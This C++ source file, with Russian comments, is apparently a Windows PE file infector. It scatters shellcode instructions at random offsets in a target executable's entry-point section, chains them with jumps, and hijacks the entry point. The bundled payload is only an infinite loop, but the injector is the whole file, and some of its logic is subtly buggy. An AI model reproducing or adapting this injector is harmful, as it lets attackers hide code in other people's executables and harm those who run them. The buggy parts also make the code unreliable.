#include <iostream>
#include <Windows.h>
#include <vector>
#include <random>
#include "disasm.h"
#include "p512.h"
byte jmpInstruction[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
byte retInstruction[] = { 0xC3, 0xCC, 0xCC };
byte antiBindInstruction[] = { 0, 0, 0, 0 };


int getRand(int from = 0, int to = INT_MAX) {
	std::random_device rd;
	std::mt19937 mt(rd());
	std::uniform_real_distribution<double> dist(from, to);
	return (int)dist(mt);
}

DWORD RVAtoFileOffset(PIMAGE_NT_HEADERS NTHeaders, DWORD dwRVA) {
	size_t countOfSections = NTHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER psh = IMAGE_FIRST_SECTION(NTHeaders);
	psh--;
	for (int i = 0; i < countOfSections; i++) {
		psh++;
		if (psh->VirtualAddress < dwRVA && psh->VirtualAddress + psh->Misc.VirtualSize > dwRVA) {
			return dwRVA - psh->VirtualAddress + psh->PointerToRawData;
		}
	}
	return -1;
}

DWORD FileOffsettoRVA(PIMAGE_NT_HEADERS NTHeaders, DWORD dwFileOffset) {
	size_t countOfSections = NTHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER psh = IMAGE_FIRST_SECTION(NTHeaders);
	psh--;
	for (int i = 0; i < countOfSections; i++) {
		psh++;
		if (psh->PointerToRawData < dwFileOffset && psh->PointerToRawData + psh->Misc.VirtualSize > dwFileOffset) {
			DWORD dwRVA = dwFileOffset - psh->PointerToRawData + psh->VirtualAddress;
			return dwRVA;
		}
	}
	return -1;
}

PIMAGE_SECTION_HEADER GetHeaderByRVA(PIMAGE_NT_HEADERS NTHeaders, DWORD dwRVA) {
	size_t countOfSections = NTHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER psh = IMAGE_FIRST_SECTION(NTHeaders);
	psh--;
	for (int i = 0; i < countOfSections; i++) {
		psh++;
		if (psh->VirtualAddress < dwRVA && psh->VirtualAddress + psh->Misc.VirtualSize > dwRVA) {
			return psh;
		}
	}
	return PIMAGE_SECTION_HEADER(-1);
}

bool vecContains(std::vector<DWORD> vec, DWORD value) {
	for (int i = 0; i < vec.size(); i++) {
		if (vec[i] == value) {
			return 1;
		}
	}
	return 0;
}



void getInstructions(char* ByteCode, size_t sizeOfByteCode, std::vector<std::vector<byte>> &instructions) {
	instructions.clear();
	size_t count = 0;
	size_t offset = 0;
	while (offset < sizeOfByteCode) {
		size_t length = get_opcode_length((uint8_t*)&ByteCode[offset]);
		instructions.resize(instructions.size() + 1);
		instructions[count].resize(length);
		for (int i = offset; i < offset + length; i++) {
			instructions[count][i - offset] = ByteCode[i];
		}
		offset += length;
		count++;
	}
}



size_t getMaxSizeFromVec(std::vector<std::vector<byte>> vec) {
	std::vector<int> sizes(0);
	size_t vecSize = vec.size();
	for (int i = 0; i < vecSize; i++) {
		sizes.push_back(vec.size());
	}
	return *std::max_element(sizes.begin(), sizes.end());
}

DWORD InstructionFileOffsetAlignUP(void* Image, PIMAGE_SECTION_HEADER psh, DWORD fileOffset) {
	DWORD ptr = psh->PointerToRawData;
	DWORD end = psh->PointerToRawData + psh->SizeOfRawData;
	while (ptr < fileOffset) {
		ptr += get_opcode_length((uint8_t*)(DWORD(Image) + ptr));
	}
	return ptr;

}

DWORD GetRandomInstructionFileOffsetInHeader(void* ImagePE, PIMAGE_SECTION_HEADER psh, size_t lengthOfInstruction, std::vector<DWORD> usedOffsets) {
	DWORD start = psh->PointerToRawData;
	DWORD end = start + psh->Misc.VirtualSize;
	DWORD offset = InstructionFileOffsetAlignUP(ImagePE, psh, getRand(start, end));
	while (offset + lengthOfInstruction > end || vecContains(usedOffsets, offset)) {
		offset = getRand(start, end);
	}
	return ImagePE, psh, offset;
}


std::vector<DWORD> GenerateOffsets(void* ImagePE, PIMAGE_SECTION_HEADER psh, std::vector<std::vector<byte>> instructions, DWORD dwEntryPoint) {
	std::vector<DWORD> usedOffsets(0);
	for (int i = 0; i < sizeof(jmpInstruction); i++) {
		usedOffsets.push_back(dwEntryPoint + i);
	}
	std::vector<DWORD> results(0);
	size_t instructionsSize = instructions.size();
	for (int i = 0; i < instructionsSize; i++) {
		DWORD offset = GetRandomInstructionFileOffsetInHeader(ImagePE, psh, instructions[i].size(), usedOffsets);
		for (int j = 0; j < instructions[i].size() + sizeof(jmpInstruction); j++) {
			usedOffsets.push_back(offset + j);
		}
		for (int j = 0; j > instructions[i].size() - sizeof(jmpInstruction); j--) {
			usedOffsets.push_back(offset + j);
		}
		results.push_back(offset);
	}
	return results;
}
size_t calcRawSize(PIMAGE_NT_HEADERS NTHeaders) {
	size_t result = 0;
	PIMAGE_SECTION_HEADER ish = IMAGE_FIRST_SECTION(NTHeaders);
	result += ish->PointerToRawData;
	result += ish->SizeOfRawData;
	for (int i = 1; i < NTHeaders->FileHeader.NumberOfSections; i++) {
		ish++;
		result += ish->SizeOfRawData;
	}
	return result;
}

std::vector<byte> getRandomInstruction() {
	std::vector<std::vector<byte>> codes = {
		{ 0x89, 0xC0 },
		{ 0x89, 0xDB },
		{ 0x89, 0xC9 },
		{ 0x89, 0xF6 },
	};
	std::vector<byte> result(0);
	for (int i = 0; i < 2; i++) {
		std::vector<byte> code = codes[getRand(0, codes.size())];
		for (int i = 0; i < code.size(); i++) {
			result.push_back(code[i]);
		}
	}
	return result;;
}

void injectBytecodeToFile(void* ImagePE, char* ByteCode, size_t sizeOfByteCode) {
	// 1. Генерируем оффсеты
	// 2. Добавляем jmp 0xXXXXXXXX в инструкции
	// 3. Заменяем байты в оффсетах на инструкции

	PIMAGE_DOS_HEADER DOSHeader = PIMAGE_DOS_HEADER(ImagePE);
	PIMAGE_NT_HEADERS NTHeaders = PIMAGE_NT_HEADERS(DWORD(ImagePE) + DOSHeader->e_lfanew);
	DWORD EPRVA = NTHeaders->OptionalHeader.AddressOfEntryPoint;
	DWORD EPFileOffset = RVAtoFileOffset(NTHeaders, EPRVA);
	PIMAGE_SECTION_HEADER EPSectionHeader = GetHeaderByRVA(NTHeaders, EPRVA);

	std::vector<std::vector<byte>> instructions(0);
	getInstructions(ByteCode, sizeOfByteCode, instructions);
	size_t instructionsCount = instructions.size();
	
	std::cout << "Number of input instructions: " << instructionsCount << "\n\n";
	std::cout << "EntryPoint Offset: 0x" << std::hex << EPFileOffset << std::dec << "\n\n";
	std::vector<DWORD> offsets = GenerateOffsets(ImagePE, EPSectionHeader, instructions, EPFileOffset);

	/*Обработка полученных инструкций:
		Добавление в конец jmp до следующего оффсета 
	*/
	for (int i = 0; i < instructionsCount; i++) {
		std::vector<byte> instruction = instructions[i];
		if (i < instructionsCount - 1) {
			int offset = (offsets[i + 1] - (offsets[i] + instruction.size())) - 0x5;
			std::vector<byte> jmpInstr(sizeof(jmpInstruction));
			for (int i = 0; i < sizeof(jmpInstruction); i++) {
				jmpInstr[i] = jmpInstruction[i];
			}
			p512::mmemcpy(&jmpInstr[1], &offset, 4);
			instruction.resize(instruction.size() + sizeof(jmpInstruction));
			p512::mmemcpy(&instruction[instruction.size() - sizeof(jmpInstruction)], &jmpInstr[0], sizeof(jmpInstruction));
		}
		else for (int i = 0; i < sizeof(retInstruction); i++) instruction.push_back(retInstruction[i]); // Последняя инструкция
		instructions[i] = instruction;
	}

	/*Меняем инструкции в оффсетах*/
	for (int i = 0; i < instructionsCount; i++) {
		std::cout << "offset[" << i << "] = 0x" << std::hex << offsets[i] << std::dec << "\n";
		p512::mmemcpy(PVOID(DWORD(ImagePE) + offsets[i] - sizeof(antiBindInstruction)), &antiBindInstruction, sizeof(antiBindInstruction));
		p512::mmemcpy(PVOID(DWORD(ImagePE) + offsets[i]), &instructions[i][0], instructions[i].size());
		p512::mmemcpy(PVOID(DWORD(ImagePE) + offsets[i] + instructions[i].size()), &antiBindInstruction, sizeof(antiBindInstruction));
	}

	/*Меняем инструкцию в EP*/
	std::vector<byte> callToFirstInstruction(jmpInstruction, jmpInstruction + sizeof(jmpInstruction));
	int offset = (offsets[0] - EPFileOffset) - 0x5;
	p512::mmemcpy(&callToFirstInstruction[1], &offset, 4);
	p512::mmemcpy(PVOID(DWORD(ImagePE) + EPFileOffset), &callToFirstInstruction[0], sizeof(jmpInstruction));
	p512::mmemcpy(PVOID(DWORD(ImagePE) + EPFileOffset + sizeof(jmpInstruction)), &antiBindInstruction, sizeof(antiBindInstruction));
}


char shellcode[] = "\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\xEB\xFC"; // infinity loop
/*
--------------------------------------------------------------------
		0:  89 c0                   mov    eax,eax
		2:  89 c0                   mov    eax,eax
		4:  89 c0                   mov    eax,eax
		6:  89 c0                   mov    eax,eax
		8:  89 c0                   mov    eax,eax
		a:  89 c0                   mov    eax,eax
		c:  89 c0                   mov    eax,eax
		e:  89 c0                   mov    eax,eax
		10: eb fc                   jmp    e <_main+0xe>
--------------------------------------------------------------------
*/


int main(int argc, char* argv[])
{
	ULONG sizeOfFile;
	char* ImagePE = (char*)p512file::ReadAllBytes(argv[1], sizeOfFile);

	injectBytecodeToFile(ImagePE, shellcode, sizeof shellcode - 1);
	
	p512file::WriteBytes(argv[2], ImagePE, sizeOfFile);
}